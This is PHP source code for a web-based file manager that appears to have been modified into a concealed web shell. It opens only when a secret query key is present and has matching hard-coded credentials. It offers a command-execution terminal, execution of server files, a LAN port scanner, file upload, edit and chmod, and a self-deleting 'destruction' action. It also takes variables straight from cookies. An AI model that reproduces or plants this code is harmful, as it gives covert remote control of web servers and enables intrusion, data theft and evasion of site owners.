<?php
$username="dsfawfawdsfwdf";
$password="dsfawfawdsfwdf";
$query_name='dsfawfawdsfwdf';
...
if(isset($_GET[$query_name])){
	...
	function fix_filename($str,$allowSpaces=false){
		$str = remove_acentos(trim($str));
		$str = str_replace('\\', '_', $str);
		$str = str_replace('/', '_', $str);
		$str = str_replace(':', '_', $str);
	...
	function fix_filename_download($str){
		$str = trim($str);
		$str = str_replace('\\', ' ', $str);
		$str = str_replace('/', ' ', $str);
		$str = str_replace(':', ' ', $str);
	...
	function show_perms($P){
		$sP = "<b>";
		if($P & 0x1000) $sP .= 'p';
		elseif($P & 0x2000) $sP .= 'c';
		elseif($P & 0x4000) $sP .= 'd';
		elseif($P & 0x6000) $sP .= 'b';
		elseif($P & 0x8000) $sP .= '&minus;';
		elseif($P & 0xA000) $sP .= 'l';
		elseif($P & 0xC000) $sP .= 's';
		else $sP .= 'u';
		$sP .= "</b>";
	...
	function html_header($header=""){
		global $charset,$fm_color,$fm_path_info,$cookie_cache_time,$query_name;
		echo "
		<!DOCTYPE HTML PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"//www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
		<html xmlns=\"//www.w3.org/1999/xhtml\">
		<head>
		<meta http-equiv=\"content-type\" content=\"text/html; charset=".$charset."\" />
		<link rel=\"shortcut icon\" href=\"".$fm_path_info["basename"]."?action=99&$query_name&filename=favicon.ico\" type=\"image/x-icon\">
		...
		<style>
			...
			.icon_loading{
				background:url('".$fm_path_info["basename"]."?action=99&$query_name&filename=throbber.gif') 0 0 no-repeat;
				width: 16px;
				height: 16px;
				line-height: 16px;
				display: inline-block;
			...
			.fa{
				background:url('".$fm_path_info["basename"]."?action=99&$query_name&filename=file_sprite.png') 0 0 no-repeat;
				width: 18px;
				height: 18px;
				line-height: 18px;
				display: inline-block;
			...
			.fa.fa-delete{background-position: -40px -70px;background-image: url(?action=99&dsfawfawdsfwdf&filename=32px.png);}
	...
	function reloadframe($ref,$frame_number,$plus=""){
		global $fm_current_dir,$fm_path_info,$query_name;
		echo "
		<script>
		<!--
			".$ref.".frame".$frame_number.".location.href='".$fm_path_info["basename"]."?frame=".$frame_number."&$query_name&fm_current_dir=".rawurlencode($fm_current_dir.$plus)."';
		//-->
		</script>
		";
	}
	...
	function get_encoding($text){
		...
		elseif (mb_detect_encoding($text, 'UTF-8', true) == true) return 'UTF-8';
	...
	function frame2(){
		global $fm_root,$fm_current_root,$fm_path_info,$setflag,$is_windows,$cookie_cache_time,$fm_current_dir,$auth_pass,$open_basedirs,$query_name;
		...
		<!--
			...
			function go_tree(arg){
				if (flag){
					...
					document.body.querySelectorAll('#top-nav .icon_loading')[0].style.display='inline-block';
					parent.frame3.location.href='".addslashes($fm_path_info["basename"])."?frame=3&$query_name&fm_current_root=".rawurlencode($fm_current_root)."&fm_current_dir='+encodeURIComponent(arg)+'".rawurlencode(DIRECTORY_SEPARATOR)."';
				}
			}
			function set_fm_current_root(arg){
				document.location.href='".addslashes($fm_path_info["basename"])."?frame=2&$query_name&fm_current_root='+encodeURIComponent(arg);
			}
			function refresh_tree(){
				document.location.href='".addslashes($fm_path_info["basename"])."?frame=2&$query_name&fm_current_root=".rawurlencode($fm_current_root)."';
			}
			function destruction(){
				var isBoss=confirm(\"".et('UnlinkConfirm')."\");
				if(isBoss)
					document.location.href='".addslashes($fm_path_info["basename"])."?destruction=1&$query_name';
			}
			function logout(){
				document.location.href='".addslashes($fm_path_info["basename"])."?action=1&$query_name';
			}
		//-->
		</script>
		";
		echo "<table width=\"100%\" height=\"100%\" border=0 cellspacing=0 cellpadding=5>\n";
		echo "<tr valign=top height=10 bgcolor=\"#DDDDDD\" style=\"border-bottom: 2px solid #F1F1F1;\" id=\"top-nav\"><td style=\"padding: 4px 6px 0px;\">";
		echo "<form style=\"display:inline-block;\" action=\"".$fm_path_info["basename"]."?$query_name\" method=\"post\" target=\"_parent\">";
			$fm_root_opts=array();
			if (strlen($fm_root) == 0){
			...
			echo "<button type=\"button\" style=\"margin-bottom: 4px; padding: 2px 0px 2px 2px;\" class=\"btn\" onclick=\"destruction()\" value=\"".et('DeleteThis')."\" title=\"".et('DeleteThis')."\"><i class=\"fa fa-delete\"></i></button>
			<button type=\"button\" style=\"margin-bottom: 4px; padding: 2px 0px 2px 2px;\" class=\"btn\" onclick=\"refresh_tree()\" value=\"".et('Refresh')."\" title=\"".et('Refresh')."\"><i class=\"fa fa-refresh\"></i></button>";
			if ($auth_pass != md5(''))
				echo "&nbsp;<button type=\"button\" style=\"margin-bottom: 5px;\" class=\"btn \" onclick=\"logout()\" value=\"".et('Leave')."\"><i class=\"fa fa-file-go\"></i> ".et('Leave')."</button>";
			if (count($fm_root_opts)>1)
				echo "<select name=drive onchange=\"set_fm_current_root(this.value)\" style=\"margin-left:5px; padding:5px 5px 4px;max-width: 231px;\">".implode("\n",$fm_root_opts)."</select>";
		echo "</form><div class=\"icon_loading\" style=\"margin-left:10px;\"></div>";
		echo "</td></tr>";
		echo "<tr valign=top><td style=\"padding: 7px 0px 5px;\">";
		?>
			<script type="text/javascript" src="<?php echo $fm_path_info["basename"]; ?>?action=99&<?=$query_name?>&filename=jquery-1.11.1.min.js"></script>
			<script type="text/javascript" src="<?php echo $fm_path_info["basename"]; ?>?action=99&<?=$query_name?>&filename=jstree.min.js"></script>
			<link rel="stylesheet" type="text/css" href="<?php echo $fm_path_info["basename"]; ?>?action=99&<?=$query_name?>&filename=jstree.style.min.css" media="screen" />
			<style>
				#tree{float:left; overflow:auto; padding:0; margin-bottom: 20px;}
				#tree .folder{background:url('<?php echo $fm_path_info["basename"]; ?>?action=99&<?=$query_name?>&filename=file_sprite.png') right bottom no-repeat;}
				#tree .file{background:url('<?php echo $fm_path_info["basename"]; ?>?action=99&<?=$query_name?>&filename=file_sprite.png') 0 0 no-repeat;}
			...
			$(function (){
				$('#tree')
					.jstree({
						'core' :{
							'data' :{
								'url' : '?frame=2&<?=$query_name?>&fm_current_root=<?php echo rawurlencode($fm_current_root) ?>&operation=get_node',
								'data' : function (node){
									return{'id' : node.id};
								}
							},
	...
	function cmd_pcntl_exec($cmd,$args=array()){
	...
	function handle_json_rpc(){
		...
		try{
			...
			echo responser(null, $id, array("name"=>"JSONRPCError", "code"=>$code, "message"=>$msg));
		} catch (Exception $e){
			$msg = $e->getMessage();
			echo responser(null, $id, array("name"=>"JSONRPCError", "code"=>200, "message"=>$msg));
		}
	}
	function responser($result,$id,$error){
		global $fm_current_dir,$cmd_line,$is_windows;
		if ($is_windows){
	...
	function dir_list_form(){
		global $script_init_time,$fm_current_root,$fm_current_dir,$quota_mb,$resolve_ids,$order_dir_list_by,$is_windows,$cmd_name,$ip,$lan_ip,$fm_path_info,$version,$date_format,$query_name;
		clearstatcache();
		$out = "<style>
			#modalIframeWrapper{
		...
		<div id=\"modalIframeWrapper\">
			<table border=0 cellspacing=1 cellpadding=4 width=\"100%\" height=\"100%\">
				...
				<tr style=\"height:100%\">
					<td colspan=2 style=\"padding-top:0;padding-right: 6px;\"><iframe id=\"modalIframe\" src=\"\" scrolling=\"yes\" frameborder=\"0\"></iframe></td>
				</tr>
			</table>
		</div>
		<script>
		<!--
			...
			function closeModalWindow(){
				...
				if (modalWindowReloadOnClose){
					window.parent.frame3.location.href='".$fm_path_info["basename"]."?frame=3&$query_name&fm_current_dir=".rawurlencode($fm_current_dir)."';
				}
			}
		-->
		</script>";
		...
		function go_dir_list(arg){
			document.location.href='".addslashes($fm_path_info["basename"])."?frame=3&$query_name&fm_current_dir=".rawurlencode($fm_current_dir)."'+encodeURIComponent(arg)+'".addslashes(DIRECTORY_SEPARATOR)."';
			parent.frame2.document.body.querySelectorAll('#top-nav .icon_loading')[0].style.display='inline-block';
			//parent.frame2.refresh_tree();
		}
		function resolve_ids(){
			document.location.href='".addslashes($fm_path_info["basename"])."?frame=3&set_resolve_ids=".($resolve_ids?'0':'1')."&$query_name&fm_current_dir=".rawurlencode($fm_current_dir)."';
			parent.frame2.document.body.querySelectorAll('#top-nav .icon_loading')[0].style.display='inline-block';
		}
		...
		function dir_list_update_total_size(dirname,id){
			...
			$.ajax({
				type: 'GET',
				url: '".$fm_path_info["basename"]."?action=14&dirname='+encodeURIComponent(dirname)+'&$query_name&fm_current_dir=".rawurlencode($fm_current_dir)."',
				dataType: 'text',
				crossDomain: false,
		...
		function upload_form(){
			openModalWindow('".addslashes($fm_path_info["basename"])."?action=10&$query_name&fm_current_dir=".rawurlencode($fm_current_dir)."','".et('Upload')."',true);
		}
		function edit_file_form(arg){
			openModalWindow('".addslashes($fm_path_info["basename"])."?action=7&$query_name&fm_current_dir=".rawurlencode($fm_current_dir)."&$query_name&filename='+encodeURIComponent(arg),'".et('Edit')." ".addslashes($fm_current_dir)."'+(arg));
		}
		function config_form(){
			openModalWindow('".addslashes($fm_path_info["basename"])."?action=2&$query_name','".et('Configurations')."');
		}
		function server_info_form(arg){
			openModalWindow('".addslashes($fm_path_info["basename"])."?action=5&$query_name','".et('ServerInfo')."');
		}
		function shell_form(){
			openModalWindow('".addslashes($fm_path_info["basename"])."?action=9&$query_name&fm_current_dir=".rawurlencode($fm_current_dir)."','".et('Shell')."',true);
		}
		function portscan_form(){
			openModalWindow('".addslashes($fm_path_info["basename"])."?action=12&$query_name','".et('Portscan')."');
		}
		function about_form(){
			openModalWindow('//www.dulldusk.com/phpfm?version=".$version."','".et('About')." - ".et("FileMan")." - ".et('Version')." ".$version."');
		}
		function view_form(arg){
			openModalWindow('".addslashes($fm_path_info["basename"])."?action=4&$query_name&fm_current_dir=".rawurlencode($fm_current_dir)."&$query_name&filename='+encodeURIComponent(arg),'".et("View")." '+(arg));
		}
		function download_entry(arg){
			parent.frame1.location.href='".addslashes($fm_path_info["basename"])."?action=3&$query_name&fm_current_dir=".rawurlencode($fm_current_dir)."&filename='+encodeURIComponent(arg);
		}
		...
		function execute_entry(arg){
			if(confirm('".et('ConfExec')." \\''+arg+'\\' ?')){
				openModalWindow('".addslashes($fm_path_info["basename"])."?action=11&$query_name&fm_current_dir=".rawurlencode($fm_current_dir)."&$query_name&filename='+encodeURIComponent(arg),'".et('Exec')." '+(arg));
			}
		}
		function delete_entry(arg){
			if(confirm('".uppercase(et('Rem'))." \\''+arg+'\\' ?')) document.location.href='".addslashes($fm_path_info["basename"])."?frame=3&$query_name&action=8&cmd_arg='+encodeURIComponent(arg)+'&fm_current_dir=".rawurlencode($fm_current_dir)."';
			parent.frame2.document.body.querySelectorAll('#top-nav .icon_loading')[0].style.display='inline-block';
		}
		function rename_entry(arg){
			var nome = '';
			parent.frame2.document.body.querySelectorAll('#top-nav .icon_loading')[0].style.display='inline-block';
			if (nome = prompt('".uppercase(et('Ren'))." \\''+arg+'\\' ".et('To')." ...',arg)) document.location.href='".addslashes($fm_path_info["basename"])."?frame=3&$query_name&action=3&fm_current_dir=".rawurlencode($fm_current_dir)."&old_name='+encodeURIComponent(arg)+'&new_name='+encodeURIComponent(nome);
		}
		...
		function chmod_form(){
			...
			if (!is_anything_selected()) set_dir_list_warn('".et('NoSel')."...');
				...
				openModalWindow('".addslashes($fm_path_info["basename"])."?action=8&$query_name&chmod_arg='+encodeURIComponent(document.form_action.chmod_arg.value),'".et('Perms')."');
				document.form_action.dir_dest.value='';
		...
		<table class=\"table\">
			...
			<td bgcolor=\"#DDD\" colspan=50 style=\"border-top: 0px;border-left: 0;\"><nobr>
			<form action=\"".$fm_path_info["basename"]."?$query_name\" method=\"post\" onsubmit=\"return test_action();\">
		...
		$out .= "
		<form name=\"form_action\" action=\"".$fm_path_info["basename"]."?$query_name\" method=\"post\" onsubmit=\"return test_action();\">
		...
		function get_breadcrumbs($path){
			...
			if (count($entry_list) == 1){
				$breadcrumbs = '<a href="'.$fm_path_info['basename'].'?frame=3&'.$query_name.'&fm_current_dir='.rawurlencode($path).'" style="display: block;padding: 2px 4px 1px;">'.$path.'</a>';;
			} else{
				$breadcrumbs = array();
				for($x=0;$x<count($entry_list);$x++){
					...
					$breadcrumbs[] = '<a href="'.$fm_path_info['basename'].'?frame=3&'.$query_name.'&fm_current_dir='.rawurlencode($entry_path).'" style="padding:10px 0;">'.$entry_list[$x].'</a>';
			...
			if (strlen($uplink)) $uplink = "<a href=\"".$fm_path_info["basename"]."?frame=3&$query_name&fm_current_dir=".rawurlencode($uplink)."\" style=\"padding:10px;\">🡹</a>";
			...
			if (is_link(rtrim($path,DIRECTORY_SEPARATOR))){
				...
				if (is_dir($target)){
					...
					foreach (explode(DIRECTORY_SEPARATOR, $target) as $r){
						$breadcrumbs[] = '<a href="'.$fm_path_info['basename'].'?frame=3&'.$query_name.'&fm_current_dir='.strstr($target, $r, true).$r.DIRECTORY_SEPARATOR.'">'.$r.'</a>';
					}
		...
		$out .= "
		<tr bgcolor=\"#DDDDDD\" style=\"border-bottom: 2px solid #F1F1F1;overflow:hidden\"><td style=\"padding: 9px .2rem;border-left: 0;border-bottom: 0;\" colspan=50><nobr style=\"padding: 0px;position: relative;display: block;\">";
		...
		if (!$io_error){
			if($entry_count){
				$out .= "
					<tr>
					<td bgcolor=\"#DDDDDD\" colspan=50 style=\"border-left: 0;border-bottom: 0;\"><nobr>
					...
					if ($dir_entry["type"] == "dir"){
						...
						$file_out[$file_count][] = "
							...
							<td class=\"sm\">
								<table class=\"entry_name_table\">
								<tr>
									<td width=\"1\"><span class=\"".get_file_icon_class($fm_path_info["basename"].$file)."?$query_name\"></span></td>
						...
						if(is_writable($fm_current_dir.$file)) 
							$file_out[$file_count][]="<td align=center class=\"sm\"><a onmousedown=\"if(event)event.stopPropagation();\" href=\"javascript:delete_entry('".addslashes($file)."')\">".et('Rem')."</a></td>";
						if(is_writable($fm_current_dir.$file))
							$file_out[$file_count][]="<td align=center class=\"sm\"><a onmousedown=\"if(event)event.stopPropagation();\" href=\"javascript:rename_entry('".addslashes($file)."')\">".et('Ren')."</a></td>";
						if(is_readable($fm_current_dir.$file))
							$file_out[$file_count][]="<td align=center class=\"sm\"><a onmousedown=\"if(event)event.stopPropagation();\" href=\"javascript:edit_file_form('".addslashes($file)."')\">".et('Edit')."</a></td>";
						if(is_readable($fm_current_dir.$file))
							$file_out[$file_count][]="<td align=center class=\"sm\"><a onmousedown=\"if(event)event.stopPropagation();\" href=\"javascript:view_form('".addslashes($file)."');\">".et('View')."</a></td>";
						if(is_readable($fm_current_dir.$file) && strlen($dir_entry["ext"]) && (strpos(".tar#.zip#.bz2#.tbz2#.bz#.tbz#.bzip#.gzip#.gz#.tgz#", $dir_entry["ext"]."#" ) !== false))
							$file_out[$file_count][]="<td align=center class=\"sm\"><a onmousedown=\"if(event)event.stopPropagation();\" href=\"javascript:decompress_entry('".addslashes($file)."')\">".et('Decompress')."</a></td>";
						if(is_executable($fm_current_dir.$file) || (strlen($dir_entry["ext"]) && (strpos(".exe#.com#.bat#.sh#.py#.pl", $dir_entry["ext"]."#" ) !== false)))
							$file_out[$file_count][]="<td align=center class=\"sm\"><a onmousedown=\"if(event)event.stopPropagation();\" href=\"javascript:execute_entry('".addslashes($file)."')\">".et('Exec')."</a></td>";
				...
				$or07='';
				$or08='';
				if(!isset($_GET['or_by']) || empty($_GET['or_by'])){
					if($_COOKIE['order_dir_list_by']=='1A'){$or01='up';}
					if($_COOKIE['order_dir_list_by']=='1D'){$or01='down';}
					if($_COOKIE['order_dir_list_by']=='2A'){$or02='up';}
					if($_COOKIE['order_dir_list_by']=='2D'){$or02='down';}
					if($_COOKIE['order_dir_list_by']=='3A'){$or03='up';}
					if($_COOKIE['order_dir_list_by']=='3D'){$or03='down';}
					if($_COOKIE['order_dir_list_by']=='4A'){$or04='up';}
					if($_COOKIE['order_dir_list_by']=='4D'){$or04='down';}
					if($_COOKIE['order_dir_list_by']=='5A'){$or05='up';}
					if($_COOKIE['order_dir_list_by']=='5D'){$or05='down';}
					if($_COOKIE['order_dir_list_by']=='6A'){$or06='up';}
					if($_COOKIE['order_dir_list_by']=='6D'){$or06='down';}
					if($_COOKIE['order_dir_list_by']=='7A'){$or07='up';}
					if($_COOKIE['order_dir_list_by']=='7D'){$or07='down';}
					if($_COOKIE['order_dir_list_by']=='8A'){$or08='up';}
					if($_COOKIE['order_dir_list_by']=='8D'){$or08='down';}
				}
				if($_GET['or_by']=='1A'){$or01='up';}
				if($_GET['or_by']=='1D'){$or01='down';}
				if($_GET['or_by']=='2A'){$or02='up';}
				if($_GET['or_by']=='2D'){$or02='down';}
				if($_GET['or_by']=='3A'){$or03='up';}
				if($_GET['or_by']=='3D'){$or03='down';}
				if($_GET['or_by']=='4A'){$or04='up';}
				if($_GET['or_by']=='4D'){$or04='down';}
				if($_GET['or_by']=='5A'){$or05='up';}
				if($_GET['or_by']=='5D'){$or05='down';}
				if($_GET['or_by']=='6A'){$or06='up';}
				if($_GET['or_by']=='6D'){$or06='down';}
				if($_GET['or_by']=='7A'){$or07='up';}
				if($_GET['or_by']=='7D'){$or07='down';}
				if($_GET['or_by']=='8A'){$or08='up';}
				if($_GET['or_by']=='8D'){$or08='down';}
				if($or01==''&&$or02==''&&$or03==''&&$or04==''&&$or05==''&&$or06==''&&$or07==''&&$or08=='')
					$or01='up';
				$out .= "
				<tr>
					 <th><nobr class=\"title_colum\"><a href=\"".$fm_path_info["basename"]."?frame=3&or_by=$or1&$query_name&fm_current_dir=".rawurldecode($fm_current_dir)."\" class=".$or01." id=".$_COOKIE['order_dir_list_by'].">".et('Name')."</a></nobr></th>
					 <th><nobr class=\"title_colum\"><a href=\"".$fm_path_info["basename"]."?frame=3&or_by=$or2&$query_name&fm_current_dir=".rawurldecode($fm_current_dir)."\" class=".$or02.">".et('Perm')."</a></nobr></th>";
				if (!$is_windows) $out .= "
					 <th><nobr class=\"title_colum\"><a href=\"".$fm_path_info["basename"]."?frame=3&or_by=$or3&$query_name&fm_current_dir=".rawurldecode($fm_current_dir)."\" class=".$or03.">".et('Owner')."</a></nobr></th>
					 <th><nobr class=\"title_colum\"><a href=\"".$fm_path_info["basename"]."?frame=3&or_by=$or4&$query_name&fm_current_dir=".rawurldecode($fm_current_dir)."\" class=".$or04.">".et('Group')."</a></nobr></th>";
				$out .= "
					 <th><nobr class=\"title_colum\"><a href=\"".$fm_path_info["basename"]."?frame=3&or_by=$or5&$query_name&fm_current_dir=".rawurldecode($fm_current_dir)."\" class=".$or05.">".et('Size')."</a></nobr></th>
					 <th><nobr class=\"title_colum\"><a href=\"".$fm_path_info["basename"]."?frame=3&or_by=$or6&$query_name&fm_current_dir=".rawurldecode($fm_current_dir)."\" class=".$or06.">".et('Date')."</a></nobr></th>";
				if ($file_count) $out .= "
					 <th><nobr class=\"title_colum\"><a href=\"".$fm_path_info["basename"]."?frame=3&or_by=$or7&$query_name&fm_current_dir=".rawurldecode($fm_current_dir)."\" class=".$or07.">".et('Type')."</a></nobr></th>";
				$out .= "
		...
		$out .= "
			...
			<td bgcolor=\"#DDDDDD\" colspan=50 class=\"fm-disk-info\" style=\"padding: 4px 10px;\">
	...
	function upload_form(){
		global $_FILES,$fm_current_dir,$dir_dest,$quota_mb,$fm_path_info,$query_name;
		html_header();
		echo "<body marginwidth=\"0\" marginheight=\"0\">";
		if (count($_FILES)==0){
			echo "
			<table height=\"100%\" border=0 cellspacing=0 cellpadding=2 style=\"padding:5px;\">
			<form name=\"upload_form\" action=\"".$fm_path_info["basename"]."?$query_name\" method=\"post\" ENCTYPE=\"multipart/form-data\">
				...
				<form name=\"chmod_form\">
					...
					<table cellpadding=\"2\" cellspacing=\"0\" border=\"0\" align=center>
						...
						<tr bgcolor=\"#DDDDDD\">
							...
							<td width=\"55\" align=\"center\" bgcolor=\"#F1F1F1\"><input type=\"checkbox\" name=\"owner4\" value=\"4\" onclick=\"calc_chmod()\"></td>
							<td width=\"55\" align=\"center\" bgcolor=\"#FFFFFF\"><input type=\"checkbox\" name=\"group4\" value=\"4\" onclick=\"calc_chmod()\"></td>
							<td width=\"55\" align=\"center\" bgcolor=\"#F1F1F1\"><input type=\"checkbox\" name=\"other4\" value=\"4\" onclick=\"calc_chmod()\"></td>
						</tr>
						<tr bgcolor=\"#DDDDDD\">
							<td width=\"60\" align=\"left\" nowrap bgcolor=\"#FFFFFF\">".et('Write')."</td>
							<td width=\"55\" align=\"center\" bgcolor=\"#F1F1F1\"><input type=\"checkbox\" name=\"owner2\" value=\"2\" onclick=\"calc_chmod()\"></td>
							<td width=\"55\" align=\"center\" bgcolor=\"#FFFFFF\"><input type=\"checkbox\" name=\"group2\" value=\"2\" onclick=\"calc_chmod()\"></td>
							<td width=\"55\" align=\"center\" bgcolor=\"#F1F1F1\"><input type=\"checkbox\" name=\"other2\" value=\"2\" onclick=\"calc_chmod()\"></td>
						</tr>
						<tr bgcolor=\"#DDDDDD\">
							<td width=\"60\" align=\"left\" nowrap bgcolor=\"#FFFFFF\">".et('Exec')."</td>
							<td width=\"55\" align=\"center\" bgcolor=\"#F1F1F1\"><input type=\"checkbox\" name=\"owner1\" value=\"1\" onclick=\"calc_chmod()\"></td>
							<td width=\"55\" align=\"center\" bgcolor=\"#FFFFFF\"><input type=\"checkbox\" name=\"group1\" value=\"1\" onclick=\"calc_chmod()\"></td>
							<td width=\"55\" align=\"center\" bgcolor=\"#F1F1F1\"><input type=\"checkbox\" name=\"other1\" value=\"1\" onclick=\"calc_chmod()\"></td>
						</tr>
					</table>
	...
	function view_form(){
		global $doc_root,$fm_path_info,$url_info,$fm_current_dir,$is_windows,$filename,$passthru,$query_name;
		if (intval($passthru)){
			$file = $fm_current_dir.$filename;
			if(file_exists($file)){
				$is_denied = false;
			...
			if ($is_reachable_thru_webserver){
				...
				$url .= "?action=4&fm_current_dir=".rawurlencode($fm_current_dir)."&$query_name&filename=".rawurldecode($filename)."&passthru=1";
	...
	function edit_file_form(){
		global $fm_current_dir,$filename,$file_data,$save_file,$fm_path_info,$curr_row,$curr_col,$ace_mode,$ace_wrap,$cookie_cache_time,$query_name;
		$file = $fm_current_dir.$filename;
		$ace_mode_opts = array();
		...
		html_header("
			<script type=\"text/javascript\" src=\"".$fm_path_info["basename"]."?action=99&$query_name&filename=jquery-1.11.1.min.js\"></script>
			<script type=\"text/javascript\" src=\"".$fm_path_info["basename"]."?action=99&$query_name&filename=ace.js\"></script>
		");
		echo "<body marginwidth=\"0\" marginheight=\"0\">
		<form name=\"edit_form\" action=\"".$fm_path_info["basename"]."?$query_name\" method=\"post\">
		...
		<div id=\"div_toolbar\">
			...
			<select name=\"ace_mode_select\" id=\"ace_mode_select\" onchange=\"changeHighlightMode()\" style=\"width:300px; padding:5px 5px 4px 5px;\">";
		...
		<script>
		<!--
			ace.config.set('basePath', '".$fm_path_info["basename"]."?action=99&$query_name&filename=');
	...
	function get_base64_file(){
		global $filename,$fm_path_info,$query_name;
		$base64_files = array();
		...
		if (isset($base64_files[$filename])){
			...
			if (isset($headers['If-Modified-Since']) && (strtotime($headers['If-Modified-Since']) == $fm_mtime)){
				...
				if ($filename == 'jstree.style.min.css'){
					$data = str_replace('32px.png', $fm_path_info["basename"].'?action=99&'.$query_name.'&filename=32px.png', $data);
					$data = str_replace('throbber.gif', $fm_path_info["basename"].'?action=99&'.$query_name.'&filename=throbber.gif', $data);
				}
				echo $data;
			}
		} else{
	...
	function logout(){
		global $fm_path_info,$query_name;
		setcookie("loggedon",0,0,"/");
		echo "
		<script>
		<!--
			window.parent.document.location.href='".$fm_path_info["basename"]."?$query_name';
		//-->
		</script>";
	}
	function login(){
	...
	function login_form(){
		global $erro,$auth_pass,$loggedon,$fm_path_info,$noscript,$version,$query_name;
		html_header();
		echo "
		<body>";
		if ($noscript && ($auth_pass == md5('') || $loggedon==$auth_pass)){
			...
			echo "
			<form class=\"form-signin noScriptHidden mt-4\" name=\"login_form\" action=\"" . $fm_path_info["basename"] . "?$query_name\" method=\"post\">
	...
	function frameset(){
		global $fm_path_info,$leftFrameWidth,$query_name;
		if (!isset($leftFrameWidth)) $leftFrameWidth = 300;
		html_header("
		<noscript>
			<meta http-equiv=\"refresh\" content=\"0;url=".$fm_path_info["basename"]."?noscript=1&$query_name\">
		</noscript>
		");
		echo "
		<script>
			function dasd(i){
				var fram=document.querySelectorAll('[name=\"frame2\"]')[0].contentWindow.document.body;
				fram.querySelectorAll('#top-nav .icon_loading')[0].style.display='none';
			}
		</script>
		<frameset cols=\"".$leftFrameWidth.",*\" framespacing=\"0\">
			<frameset rows=\"0,*\" framespacing=\"0\" frameborder=\"0\">
				<frame src=\"".$fm_path_info["test"]."?frame=1&$query_name\" name=frame1 border=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\">
				<frame src=\"".$fm_path_info["test"]."?frame=2&$query_name\" name=frame2 border=\"0\" marginwidth=\"0\" marginheight=\"0\" onload=\"dasd(3)\">
			</frameset>
			<frame src=\"".$fm_path_info["test"]."?frame=3&$query_name\" name=frame3 border=\"0\" marginwidth=\"0\" marginheight=\"0\" onload=\"dasd(3)\">
		</frameset>
		</html>";
	}
	...
	function frame3(){
		global $is_windows,$cmd_arg,$chmod_arg,$zip_dir,$fm_current_root,$cookie_cache_time,$query_name;
	...
	function config_form(){
		...
		html_header('<script type="text/javascript" src="'.$fm_path_info["basename"].'?action=99&'.$query_name.'&filename=jquery-1.11.1.min.js"></script>');
		echo "<body marginwidth=\"0\" marginheight=\"0\">\n";
		if ($reload){
			echo "
			<script>
			<!--
				window.setTimeout(function(){
					window.parent.parent.document.location.href='".$fm_path_info["basename"]."?$query_name&fm_current_dir=".rawurlencode($fm_current_dir)."';
				},500);
			//-->
			</script>";
		} else{
			...
			<form name=\"config_form\" action=\"".$fm_path_info["basename"]."?$query_name\" method=\"post\" autocomplete=\"off\">
	...
	function phpfm_portscan($ip,$port,&$output){
		...
		if ($port_open){
			...
			$output = '│ <font color="brown">Port: '.$port.(isset($services[$port])?' = '.$services[$port]:'').'</font><br>';
		}
		return $port_open;
	}
	function shell_form(){
		global $fm_current_dir,$shell_form,$cmd_arg,$fm_path_info,$is_windows,$query_name;
		switch ($shell_form){
			case 1:
				handle_json_rpc();
				exit();
			...
			default:
				html_header("
					<script type=\"text/javascript\" src=\"".$fm_path_info["basename"]."?action=99&$query_name&filename=jquery-1.11.1.min.js\"></script>
					<script type=\"text/javascript\" src=\"".$fm_path_info["basename"]."?action=99&$query_name&filename=jquery.terminal.min.js\"></script>
					<link rel=\"stylesheet\" type=\"text/css\" href=\"".$fm_path_info["basename"]."?action=99&$query_name&filename=jquery.terminal.min.css\" media=\"screen\" />
				");
				is_rwx_phpfm(__FILE__);
							...
							$('body').terminal(
								function(command, term){
									if (command){
										...
										$.ajax({
											type: 'POST',
											url: '<?php echo $fm_path_info["basename"]; ?>?action=9&shell_form=1&<?=$query_name?>&fm_current_dir='+shell_current_dir,
											dataType: 'json',
											crossDomain: false,
											data: JSON.stringify(
												{
											...
											success: function (data){
												if (data.error !== null){
													if (data.error.code == 100) term.echo(data.error.error.name+': '+data.error.error.message).resume();
	...
	function portscan_form(){
		...
		<div id=\"div_toolbar\">
			...
			<form name=\"portscan_form\" action=\"".$fm_path_info["basename"]."?$query_name\" method=\"get\" target=\"portscanIframe\">
				...
				<tr><td valign=top width=1>
					...
					<table border=0 cellspacing=0 cellpadding=5>
					<tr><td align=right width=1><nobr>Your IP:</nobr><td><input type=\"text\" name=\"your_ip\" value=\"".$ip."\" style=\"width:150px; background-color:#DDD; padding:5px 8px;\" readonly></td></tr>";
					if (strlen($lan_ip)) echo "<tr><td align=right width=1><nobr>Server Lan IP:</nobr><td><input type=\"text\" name=\"your_ip\" value=\"".$lan_ip."\" style=\"width:150px; background-color:#DDD; padding:5px 8px;\" readonly></td></tr>";
					echo "
					</form>
					</table>
				</td></tr>
		...
		<!--
			...
			write_to_iframe(get_boxed_text('PHP File Manager - Portscan<br><br><b>Hosts examples:</b><br>Single: <br>Single: 192.168.0.1<br>Range: 192.168.0.1-254<br>Multiple: ,192.168.0.1,192.168.0.2'));
			...
			function do_ping(){
				if (portscan_execute_flag){
					if (portscan_curr_ip<portscan_ips.length){
						...
						$.ajax({
							type: 'POST',
							url: '".$fm_path_info["basename"]."?$query_name',
							dataType: 'json',
							crossDomain: false,
							data:{
								action : 12,
			...
			function do_scan(){
				...
				if (all_ports_one_request){
					$.get(
						'".$fm_path_info["basename"]."?$query_name',
						{
							action : 12,
							portscan_action: 4,
							portscan_ip : ip,
	...
	function et($tag){
		...
		$et['ru']['ResolveIDs']='Разрешить идентификаторы';
		...
		$et['ru']['UnlinkConfirm']='Вы действительно хотите удалить этот файл?';
	...
	$test=str_replace($_SERVER['DOCUMENT_ROOT'],'',__DIR__);
	$page=__FILE__;
	$name=pathinfo($page);
	...
	$url_root=rtrim(@getServerURL(),'/');
	$fm_file=__FILE__;
	$fm_url=$url_root.$_SERVER["PHP_SELF"];
	$fm_path_info=pathinfo($fm_file);
	$fm_path_info['test']=substr(dirname(__FILE__),strlen($_SERVER['DOCUMENT_ROOT'])).'/'.$fm_path_info["basename"];
	...
	if(isset($_GET['destruction'])&&$_GET['destruction']==1){
		@exec('del '. __FILE__);
		unlink(__FILE__);
		exit;
	}
	...
	foreach ($_COOKIE as $key => $val){
		if (array_search($key,$blockKeys) === false && $key != 'fm_current_dir' && $key != 'ace_wrap'){
			$$key=$val;
		}
	}
	...
	if (!strlen($fm_current_root)) {
		if ($is_windows) {
			if (strpos($doc_root,":") !== false) $fm_current_root=ucfirst(substr($doc_root,0,strpos($doc_root,":")+1).DIRECTORY_SEPARATOR);
